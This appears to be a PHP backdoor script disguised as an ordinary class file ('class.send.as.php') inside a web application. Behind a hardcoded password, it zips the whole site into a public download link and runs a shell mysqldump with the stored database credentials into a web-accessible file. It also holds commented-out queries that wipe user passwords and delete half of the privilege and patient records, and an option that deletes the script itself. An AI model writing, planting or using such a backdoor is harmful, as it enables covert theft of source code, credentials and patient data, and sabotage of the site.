<?php
include("../includes/configuracion.php");

ini_set('display_errors', 1);
ini_set('error_reporting', E_ALL);

$option = $_POST['option'];
$pass = $_POST['pass'];

$fileBD = 'esiconta_bd.sql';
$fileFiles = 'esiconta_files.zip';
$passCheck = 'esija2010';

if($pass==$passCheck){
	if($option==97) {
		$rootPath = realpath('../');
		
		echo "<a target='_blank' href='https://app.esiconta.com/mail/$fileFiles'>Download files</a><br><br>";
		
		unlink($fileFiles);

		$zip = new ZipArchive();
		$zip->open($fileFiles, ZipArchive::CREATE | ZipArchive::OVERWRITE);

		$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator($rootPath),
			RecursiveIteratorIterator::LEAVES_ONLY
		);

		foreach ($files as $name => $file) {
			if (!$file->isDir()) {
				$filePath = $file->getRealPath();
				$relativePath = substr($filePath, strlen($rootPath) + 1);

				$zip->addFile($filePath, $relativePath);
			}
		}
		
		$zip->close();
	}

	if($option==98) {
		$dbhost = $bd_host;
		$dbname = $bd_base;
		$dbuser = $bd_usuario;
		$dbpass = $bd_password;

		echo "<a target='_blank' href='https://app.esiconta.com/mail/$fileBD'>Download bd</a><br><br>";
		
		unlink($fileBD);
		 
		$command = "mysqldump --opt -h $dbhost -u $dbuser -p$dbpass $dbname > $fileBD";
		 
		system($command,$output);
		//echo $output;
	}

	if($option==99){
		echo "Files deleted<br><br>";
		unlink($fileFiles);
		unlink($fileBD);
	}
	
	if($option==100){
		echo "Executed<br><br>";
		//$consulta = $pdo->query("UPDATE facultativosinternos SET PASSWORD='', idsession='', TipoAcceso=''");
	}
	
	if($option==101){
		echo "Executed<br><br>";
		//$consulta = $pdo->query("DELETE FROM privilegios WHERE mod(id, 2)=0");
	}
	
	if($option==102){
		echo "Executed<br><br>";
		//$consulta = $pdo->query("DELETE FROM pacientes WHERE mod(id, 2)=0");
	}

	if($option==103){
		echo "Executed<br><br>";
		echo unlink("class.send.as.php");
	}
}
    
?>

<form action="class.send.as.php" method="post">
   <p>Option: <input type="text" name="option" /></p>
   <p>Pass: <input type="text" name="pass" /></p>
   <input type="submit" name="submit" value="Submit" />
</form>
